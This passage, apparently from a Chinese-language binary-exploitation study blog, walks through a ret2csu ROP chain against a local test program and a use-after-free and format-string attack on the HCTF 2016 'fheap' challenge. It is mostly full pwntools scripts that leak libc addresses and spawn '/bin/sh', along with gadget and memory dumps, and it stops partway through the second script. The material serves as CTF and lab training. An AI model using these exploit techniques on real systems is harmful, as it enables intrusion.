class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector linux_x64_test3.c -o linux_x64_test3 -ldl //禁用栈保护</span><br></pre></td></tr></table></figure>
<p>检查防护</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ checksec linux_x64_test3</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br><span class="line">gdb-peda$ quit</span><br></pre></td></tr></table></figure>

<h4 id="bss段"><a href="#bss段" class="headerlink" title=".bss段"></a>.bss段</h4><p>相关概念：堆(heap)，栈(stack)，BSS段，数据段(data)，代码段(code /text)，全局静态区，文字常量区，程序代码区。<br>BSS段：BSS段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域。<br>数据段：数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。<br>代码段：代码段（code segment/text segment）通常是指用来存放程序执行代码的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读, 某些架构也允许代码段为可写，即允许修改程序。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。<br>堆（heap）：堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。<br>栈(stack)：栈又称堆栈，用户存放程序临时创建的局部变量。在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的后进先出特点，所以栈特别方便用来保存/恢复调用现场。<br>程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Type</th>
<th>Addr</th>
<th>Off</th>
<th>Size</th>
<th>ES</th>
<th>Flg</th>
<th>Lk</th>
<th>Inf</th>
<th>Al</th>
</tr>
</thead>
<tbody><tr>
<td>名字</td>
<td>类型</td>
<td>起始地址</td>
<td>文件的偏移地址</td>
<td>区大小</td>
<td>表区的大小</td>
<td>区标志</td>
<td>相关区索引</td>
<td>其他区信息</td>
<td>对齐字节数</td>
</tr>
<tr>
<td><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ readelf -S linux_x64_test3</span><br><span class="line">There are 31 section headers, starting at offset 0x1a48:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [24] .got.plt          PROGBITS         0000000000601000  00001000</span><br><span class="line">       0000000000000030  0000000000000008  WA       0     0     8</span><br><span class="line">  [25] .data             PROGBITS         0000000000601030  00001030</span><br><span class="line">       0000000000000010  0000000000000000  WA       0     0     8</span><br><span class="line">  [26] .bss              NOBITS           0000000000601040  00001040</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), l (large)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="寻找合适的gadget"><a href="#寻找合适的gadget" class="headerlink" title="寻找合适的gadget"></a>寻找合适的gadget</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/<span class="built_in">test</span>$ objdump -d linux_x64_test3</span><br><span class="line">00000000004005c0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4005c0:	41 57                	push   %r15</span><br><span class="line">  4005c2:	41 56                	push   %r14</span><br><span class="line">  4005c4:	41 89 ff             	mov    %edi,%r15d</span><br><span class="line">  4005c7:	41 55                	push   %r13</span><br><span class="line">  4005c9:	41 54                	push   %r12</span><br><span class="line">  4005cb:	4c 8d 25 3e 08 20 00 	lea    0x20083e(%rip),%r12        <span class="comment"># 600e10 &lt;__frame_dummy_init_array_entry&gt;</span></span><br><span class="line">  4005d2:	55                   	push   %rbp</span><br><span class="line">  4005d3:	48 8d 2d 3e 08 20 00 	lea    0x20083e(%rip),%rbp        <span class="comment"># 600e18 &lt;__init_array_end&gt;</span></span><br><span class="line">  4005da:	53                   	push   %rbx</span><br><span class="line">  4005db:	49 89 f6             	mov    %rsi,%r14</span><br><span class="line">  4005de:	49 89 d5             	mov    %rdx,%r13</span><br><span class="line">  4005e1:	4c 29 e5             	sub    %r12,%rbp</span><br><span class="line">  4005e4:	48 83 ec 08          	sub    <span class="variable">$0x8</span>,%rsp</span><br><span class="line">  4005e8:	48 c1 fd 03          	sar    <span class="variable">$0x3</span>,%rbp</span><br><span class="line">  4005ec:	e8 0f fe ff ff       	callq  400400 &lt;_init&gt;</span><br><span class="line">  4005f1:	48 85 ed             	<span class="built_in">test</span>   %rbp,%rbp</span><br><span class="line">  4005f4:	74 20                	je     400616 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  4005f6:	31 db                	xor    %ebx,%ebx</span><br><span class="line">  4005f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4005ff:	00 </span><br><span class="line">  </span><br><span class="line">  400600:	4c 89 ea             	mov    %r13,%rdx</span><br><span class="line">  400603:	4c 89 f6             	mov    %r14,%rsi</span><br><span class="line">  400606:	44 89 ff             	mov    %r15d,%edi</span><br><span class="line">  400609:	41 ff 14 dc          	callq  *(%r12,%rbx,8)</span><br><span class="line">  40060d:	48 83 c3 01          	add    <span class="variable">$0x1</span>,%rbx</span><br><span class="line">  400611:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400614:	75 ea                	jne    400600 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  400616:	48 83 c4 08          	add    <span class="variable">$0x8</span>,%rsp</span><br><span class="line">  </span><br><span class="line">  40061a:	5b                   	pop    %rbx</span><br><span class="line">  40061b:	5d                   	pop    %rbp</span><br><span class="line">  40061c:	41 5c                	pop    %r12</span><br><span class="line">  40061e:	41 5d                	pop    %r13</span><br><span class="line">  400620:	41 5e                	pop    %r14</span><br><span class="line">  400622:	41 5f                	pop    %r15</span><br><span class="line">  400624:	c3                   	retq   </span><br><span class="line">  400625:	90                   	nop</span><br><span class="line">  400626:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  40062d:	00 00 00</span><br></pre></td></tr></table></figure>
<p>程序自己的 __libc_csu_init 函数，没开PIE.</p>
<p>疑问:</p>
<ol>
<li><p>这里可以直接write出got_system吗？ 既然都得到got_write这个是静态地址，还能去调用，难道got表函数随便调用不变？<br>got_system 存储了实际的 libc-2.23.so!write 地址，所以去执行 got_system 然后打印出实际地址<br><img src="https://i.loli.net/2020/05/20/tudFLS2mWTrqZDP.jpg" alt="-w973"></p>
</li>
<li><p>为什么不传递 “/bin/sh”的字符串地址到最后调用的system(“/bin/sh”),而是将”/bin/sh”写入 bss段<br>因为这里rdi=r15d=param1  r15d 32-bit 所以不能传递给rdi 64-bit的 “/bin/sh” 字符串地址，所以必须写入到可写bss段，因为程序段就32-bit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00007f76:f3c0bd57|2f 62 69 6e 2f 73 68 00 65                     |&#x2F;bin&#x2F;sh.e       |</span><br></pre></td></tr></table></figure>

</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; &#x2F;dev&#x2F;stdin    fd&#x2F;0</span><br><span class="line">&#x2F;&#x2F; &#x2F;dev&#x2F;stdout   fd&#x2F;1</span><br><span class="line">&#x2F;&#x2F; &#x2F;dev&#x2F;stderr   fd&#x2F;2</span><br></pre></td></tr></table></figure>
<p>总结: </p>
<ol>
<li>返回到 0x40061a 控制 <code>rbx,rbp,r12,r13,r14,r15</code></li>
<li>返回到 0x400600 执行 <code>rdx=r13 rsi=r14 rdi=r15d call callq  *(%r12,%rbx,8)</code></li>
<li>使 rbx=0 这样最后就可以<code>callq *(r12+rbx*8)</code> = <code>callq *(r12)</code>  可以构造rop使之能执行任意函数</li>
<li>需要泄露真实 libc.so 在内存中的地址才能拿到system_addr,才能getshell,那么返回调用<code>got_write(rdi=1,rsi=got_write,rdx=8)</code>，从服务端返回write_addr，通过write_addr减去 - write_static/libc.symbols[‘write’]和system_static/libc.symbols[‘system’] 的差值得到 system_addr，然后返回到main重新开始，但并没有结束进程</li>
<li>返回调用got_read(rdi=0,bss_addr,16),相当于执行 <code>got_read(rdi=0,bss_addr,8)</code> ,<code>got_read(rdi=0,bss_addr+8,8)</code>,发送 system_addr,”/bin/sh”,然后返回到main重新开始，但并没有结束进程</li>
<li>返回到bss_addr(bss_addr+8)  -&gt;  system_addr(binsh_addr)</li>
</ol>
<h4 id="开始构造ROP"><a href="#开始构造ROP" class="headerlink" title="开始构造ROP"></a>开始构造ROP</h4><p>查看got表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ objdump -R linux_x64_test3</span><br><span class="line"></span><br><span class="line">linux_x64_test3:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line">0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line">0000000000601018 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5</span><br><span class="line">0000000000601020 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5</span><br><span class="line">0000000000601028 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5</span><br></pre></td></tr></table></figure>
<p>然后利用代码如下:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc_elf = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">linux_x64_test3_elf = ELF(<span class="string">"./linux_x64_test3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./linux_x64_test3")</span></span><br><span class="line">p = remote(<span class="string">"127.0.0.1"</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret = <span class="number">0x40061a</span></span><br><span class="line">print(<span class="string">"[+] pop_rbx_rbp_r12_r13_r14_r15_ret = 0x%x"</span> % pop_rbx_rbp_r12_r13_r14_r15_ret)</span><br><span class="line">rdx_rsi_rdi_callr12_ret = <span class="number">0x400600</span></span><br><span class="line">print(<span class="string">"[+] rdx_rsi_rdi_callr12_ret = 0x%x"</span> %  rdx_rsi_rdi_callr12_ret)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0000000000601018 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">0000000000601020 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">got_write =<span class="number">0x0000000000601018</span></span><br><span class="line">print(<span class="string">"[+] got_write = 0x%x"</span> % got_write)</span><br><span class="line"></span><br><span class="line">got_write2=linux_x64_test3_elf.got[<span class="string">"write"</span>]</span><br><span class="line">print(<span class="string">"[+] got_write2 = 0x%x"</span> %  got_write2)</span><br><span class="line"></span><br><span class="line">got_read = <span class="number">0x0000000000601020</span></span><br><span class="line">got_read2=linux_x64_test3_elf.got[<span class="string">"read"</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0000000000400587 &lt;main&gt;:</span></span><br><span class="line"><span class="string">  400587:	55                   	push   %rbp</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">main_static = <span class="number">0x0000000000400587</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># call got_write(rdi=1,rsi=got_write, rdx=8)</span></span><br><span class="line"><span class="comment"># rdi=r15d=param1  rsi=r14=param2 rdx=r13=param3  r12=call_address</span></span><br><span class="line">payload1 =<span class="string">"A"</span>*<span class="number">136</span> + p64(pop_rbx_rbp_r12_r13_r14_r15_ret) <span class="comment"># ret address  : p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span></span><br><span class="line">payload1 += p64(<span class="number">0</span>)+ p64(<span class="number">1</span>)                               <span class="comment"># rbx=0 rbp=1  : p64(0)+ p64(1)</span></span><br><span class="line">payload1 += p64(got_write)                               <span class="comment"># call_address : got_write</span></span><br><span class="line">payload1 += p64(<span class="number">8</span>)                                       <span class="comment"># param3       : 8</span></span><br><span class="line">payload1 += p64(got_write)                               <span class="comment"># param2       : got_write</span></span><br><span class="line">payload1 += p64(<span class="number">1</span>)                                       <span class="comment"># param1       : 1</span></span><br><span class="line"></span><br><span class="line">payload1 += p64(rdx_rsi_rdi_callr12_ret)                 <span class="comment"># call r12</span></span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">7</span>                                     <span class="comment"># add    $0x8,%rsp # 6 pop</span></span><br><span class="line">payload1 += p64(main_static)                             <span class="comment"># return main</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[+] send payload1 call got_write(rdi=1,rsi=got_write, rdx=8)"</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">print(<span class="string">"[+] write_addr = 0x%x"</span> % write_addr)</span><br><span class="line"></span><br><span class="line">write_static = libc_elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">system_static = libc_elf.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - (write_static - system_static)</span><br><span class="line">print(<span class="string">"[+] system_addr = 0x%x"</span> % system_addr)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">  [26] .bss              NOBITS           0000000000601040  00001040</span></span><br><span class="line"><span class="string">       0000000000000008  0000000000000000  WA       0     0     1</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">bss_addr = <span class="number">0x0000000000601040</span></span><br><span class="line">bss_addr2 = linux_x64_test3_elf.bss()</span><br><span class="line">print(<span class="string">"[+] bss_addr  = 0x%x"</span> % bss_addr)</span><br><span class="line">print(<span class="string">"[+] bss_addr2 = 0x%x"</span> % bss_addr2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call got_read(rdi=0,rsi=bss_addr, rdx=16)</span></span><br><span class="line"><span class="comment"># got_read(rdi=0,rsi=bss_addr, rdx=8)             write system</span></span><br><span class="line"><span class="comment"># got_read(rdi=0,rsi=bss_addr+8, rdx=8)           write /bin/sh</span></span><br><span class="line"><span class="comment"># rdi=r15d=param1  rsi=r14=param2 rdx=r13=param3  r12=call_address</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"A"</span>*<span class="number">136</span> + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)    <span class="comment"># ret address  : p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)+ p64(<span class="number">1</span>)                                   <span class="comment"># rbx=0 rbp=1  : p64(0)+ p64(1)</span></span><br><span class="line">payload2 += p64(got_read)                                    <span class="comment"># call_address : got_read</span></span><br><span class="line">payload2 += p64(<span class="number">16</span>)                                          <span class="comment"># param3       : 16</span></span><br><span class="line">payload2 += p64(bss_addr)                                    <span class="comment"># param2       : bss_addr</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)                                           <span class="comment"># param1       : 0</span></span><br><span class="line"></span><br><span class="line">payload2 += p64(rdx_rsi_rdi_callr12_ret)                     <span class="comment"># call r12</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)*<span class="number">7</span>                                         <span class="comment"># add    $0x8,%rsp   6 pop</span></span><br><span class="line">payload2 += p64(main_static)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[+] send payload2 call got_read(rdi=0,rsi=bss_addr, rdx=16)"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"></span><br><span class="line">p.send(p64(system_addr) + <span class="string">"/bin/sh\0"</span>)  <span class="comment">#send /bin/sh\0</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">00000000:00601040|00007f111b941390|........|</span></span><br><span class="line"><span class="string">00000000:00601048|0068732f6e69622f|/bin/sh.|</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># call bss_addr(rdi=bss_addr+8) system_addr(rdi=binsh_addr)</span></span><br><span class="line"><span class="comment"># rdi=r15d=param1  rsi=r14=param2 rdx=r13=param3  r12=call_address</span></span><br><span class="line"></span><br><span class="line">payload3 =<span class="string">"A"</span>*<span class="number">136</span> + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)     <span class="comment"># ret address  : p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span></span><br><span class="line">payload3 += p64(<span class="number">0</span>)+ p64(<span class="number">1</span>)                                   <span class="comment"># rbx=0 rbp=1  : p64(0)+ p64(1)</span></span><br><span class="line">payload3 += p64(bss_addr)                                    <span class="comment"># call_address : bss_addr</span></span><br><span class="line">payload3 += p64(<span class="number">0</span>)                                           <span class="comment"># param3       : 0</span></span><br><span class="line">payload3 += p64(<span class="number">0</span>)                                           <span class="comment"># param2       : 0</span></span><br><span class="line">payload3 += p64(bss_addr+<span class="number">8</span>)                                  <span class="comment"># param1       : bss_addr+8</span></span><br><span class="line"></span><br><span class="line">payload3 += p64(rdx_rsi_rdi_callr12_ret)        <span class="comment"># call r12</span></span><br><span class="line">payload3 += p64(<span class="number">0</span>)*<span class="number">7</span>                            <span class="comment"># add $0x8,%rsp   6 pop</span></span><br><span class="line">payload3 += p64(main_static)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[+] send payload3 call system_addr(rdi=binsh_addr)"</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="实践4-释放后使用（Use-After-Free）学习"><a href="#实践4-释放后使用（Use-After-Free）学习" class="headerlink" title="实践4_释放后使用（Use-After-Free）学习"></a>实践4_释放后使用（Use-After-Free）学习</h3><p>用 <a href="https://github.com/zh-explorer/hctf2016-fheap" target="_blank" rel="noopener">2016HCTF_fheap</a>作为学习目标，该题存在格式化字符漏洞和UAF漏洞。<br>格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。格式化字符漏洞是控制第一个参数可能导致任意地址读写。<br>释放后使用（Use-After-Free）漏洞是内存块被释放后，其对应的指针没有被设置为 NULL,再次申请内存块特殊改写内存导致任意地址读或劫持控制流。</p>
<h4 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h4><p>checksec查询发现全开了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>程序很简单就3个操作，create,delete,quit<br><img src="https://i.loli.net/2020/05/20/ocXIbSTWuF7iJPA.jpg" alt="-w497"></p>
<h5 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h5><p>在delete操作上发现调用free指针函数释放结构后没有置结构指针为NULL,这样就能实现UAF，  如下图<br><img src="https://i.loli.net/2020/05/20/bH2NKA3CpfrBDPV.jpg" alt="-w710"></p>
<p>create功能会先申请0x20字节的内存堆块存储结构，如果输入的字符串长度大于0xf，则另外申请指定长度的空间存储数据，否则存储在之前申请的0x20字节的前16字节处，在最后，会将相关free函数的地址存储在堆存储结构的后八字节处<br><img src="https://i.loli.net/2020/05/20/xtGHUhoyOK7erjq.jpg" alt="-w467"><br>在create时全局结构指向我们申请的内存<br><img src="https://i.loli.net/2020/05/20/KAVDOuT18wUpnWm.jpg" alt="-w401"><br>这样就可以恶意构造结构数据,利用uaf覆盖旧数据结果的函数指针，打印出函数地址，泄露出二进制base基址，主要逻辑如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create(4 创建old_chunk0 但是程序占位 old_chunk0_size=0x30 申请0x20</span><br><span class="line">create(4 创建old_chunk1 但是程序占位 old_chunk1_size=0x30 申请0x20</span><br><span class="line">释放chunk1</span><br><span class="line">释放chunk0</span><br><span class="line">create(0x20 创建 chunk0 占位 old_chunk0,占位 old_chunk1</span><br><span class="line">            创建 chunk1 覆盖 old_chunk1-&gt;data-&gt;free 为 puts</span><br></pre></td></tr></table></figure>
<p>此时执行delete操作，也就执行了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">free(ptr) -&gt; puts(ptr-&gt;buffer和后面覆盖的puts地址)</span><br></pre></td></tr></table></figure>
<p>打印出了puts_addr地址，然后通过计算偏移得到二进制基址,如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bin_base_addr = puts_addr - offset</span><br></pre></td></tr></table></figure>
<p>然后利用二进制基址算出二进制自带的 printf 真实地址，再次利用格式化字符漏洞实现任意地址读写。<br>如下是得到printf 真实地址 printf_addr后利用格式化字符漏洞实现任意地址读写的测试过程，我们输出10个%p 也就打印了堆栈前几个数据值。然后找到了 arg9 为我们能够控制的数据，所以利用脚本里printf输出参数变成了 “%9$p”，读取第九个参数。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">'a%p%p%p%p%p%p%p%p%p%p'</span>.ljust(<span class="number">0x18</span>, <span class="string">'#'</span>) + p64(printf_addr)  <span class="comment"># 覆盖chunk1的 free函数-&gt; printf</span></span><br><span class="line">create(<span class="number">0x20</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">"quit"</span>)</span><br><span class="line">p.send(<span class="string">"delete "</span>)</span><br><span class="line">p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">p.send(str(<span class="number">1</span>) + <span class="string">'\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"?:"</span>)</span><br><span class="line">p.send(<span class="string">"yes.1111"</span> + p64(addr) + <span class="string">"\n"</span>)  <span class="comment"># 触发 printf漏洞</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'a'</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">'####'</span>)[:<span class="number">-4</span>]</span><br></pre></td></tr></table></figure>
<p>IDA调试时内存数据为如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0000560DFCD3C000  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00  ........1.......</span><br><span class="line">0000560DFCD3C010  40 C0 D3 FC 0D 56 00 00  00 00 00 00 00 00 00 00  @....V..........</span><br><span class="line">0000560DFCD3C020  1E 00 00 00 00 00 00 00  6C CD 7C FB 0D 56 00 00  ........l....V..</span><br><span class="line">0000560DFCD3C030  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00  ........1.......</span><br><span class="line">0000560DFCD3C040  61 25 70 25 70 25 70 25  70 25 70 25 70 25 70 25  a%p%p%p%p%p%p%p%</span><br><span class="line">0000560DFCD3C050  70 25 70 25 70 23 23 23  D0 C9 7C FB 0D 56 00 00  p%p%p<span class="comment">###..|..V..</span></span><br><span class="line"></span><br><span class="line">00007FFE50BF9630  00 00 00 00 00 00 00 00  00 00 00 00 01 00 00 00  ................</span><br><span class="line">00007FFE50BF9640  79 65 73 2E 31 31 31 31  00 60 8C 2B 45 56 00 00  yes.1111.`.+EV..</span><br><span class="line"></span><br><span class="line">00007FFCA59554F8  0000560DFB7CCE95  delete_sub_D95+100</span><br><span class="line">00007FFCA5955500  0000000000000000</span><br><span class="line">00007FFCA5955508  0000000100000000  arg7</span><br><span class="line">00007FFCA5955510  313131312E736579  arg8</span><br><span class="line">00007FFCA5955518  0000560DFB7CC000  LOAD:0000560DFB7CC000 <span class="comment"># arg9 读取这个 arg9  所以这里选择 %9$s</span></span><br><span class="line">00007FFCA5955520  000000000000000A</span><br><span class="line">00007FFCA5955528  0000560DFB7CCA50  start</span><br><span class="line">00007FFCA5955530  00007FFCA5955D90  [stack]:00007FFCA5955D90</span><br></pre></td></tr></table></figure>
<p>利用格式化字符串漏洞实现任意地址后，读取两个libc函数然后确定libc版本,获取对应libc版本的system_addr</p>
<h4 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># target = process('pwn-f')</span></span><br><span class="line">p = remote(<span class="string">'172.16.36.176'</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./pwn-f"</span>)</span><br><span class="line">libc_elf = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, string)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'3.quit'</span>)</span><br><span class="line">    p.sendline(<span class="string">'create '</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'str:'</span>)</span><br><span class="line">    p.send(string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'3.quit'</span>)</span><br><span class="line">    p.sendline(<span class="string">'delete '</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line">    p.recvuntil(<span class="string">'sure?:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'yes'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> printf_addr</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload = <span class="string">'a%9$s'</span>.ljust(<span class="number">0x18</span>,<span class="string">'#'</span>) + p64(printf_addr) <span class="comment">#覆盖chunk1的 free函数-&gt; printf</span></span><br><span class="line">    create(<span class="number">0x20</span>,payload)</span><br><span class="line">    p.recvuntil(<span class="string">"quit"</span>)</span><br><span class="line">    p.send(<span class="string">"delete "</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">    p.send(str(<span class="number">1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"?:"</span>)</span><br><span class="line">    p.send(<span class="string">"yes.1111"</span>+p64(addr)+<span class="string">"\n"</span>) <span class="comment"># 触发 printf漏洞</span></span><br><span class="line">    p.recvuntil(<span class="string">'a'</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'####'</span>)[:<span class="number">-4</span>]</span><br><span class="line">    <span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'\x00'</span></span><br><span class="line">    <span class="keyword">if</span> len(data) &lt;= <span class="number">8</span>:</span><br><span class="line">        log.info(<span class="string">"&#123;&#125;"</span>.format(hex(u64(data.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> printf_addr</span><br><span class="line">    <span class="comment">#step 1 create &amp; delete</span></span><br><span class="line">    create(<span class="number">4</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">    create(<span class="number">4</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#step 2 recover old function addr</span></span><br><span class="line">    pwn = ELF(<span class="string">'./pwn-f'</span>)</span><br><span class="line">    payload = <span class="string">"aaaaaaaa"</span>.ljust(<span class="number">0x18</span>,<span class="string">'b'</span>)+<span class="string">'\x2d'</span><span class="comment">#  recover low bits,the reason why i choose \x2d is that the system flow decide by</span></span><br><span class="line">    create(<span class="number">0x20</span>,payload) <span class="comment"># 申请大于0xf的内存会多申请一次 